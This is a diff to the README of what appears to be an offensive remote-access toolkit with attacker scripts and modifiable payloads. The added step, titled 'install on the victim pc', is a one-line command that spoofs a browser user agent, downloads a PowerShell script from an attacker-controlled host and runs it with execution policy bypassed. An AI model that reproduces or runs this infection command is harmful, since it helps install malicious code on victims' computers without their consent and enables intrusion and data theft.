@@ -67,6 +67,10 @@
    ```bash
    python attacker/attacker.py
    ```
+6. **install on the victim pc:** this will be the installer command for victim
+   ```powershell
+   curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -o install.ps1 http://<ip>:7777/install && powershell -ExecutionPolicy Bypass -File .\install.ps1
+   ```
 ## Configuration
 ### Modifying the Payload 
 The payload and its behavior can be easily modified in the ``server/payloads/`` directory. You can create new payloads or modify existing ones by following these steps:
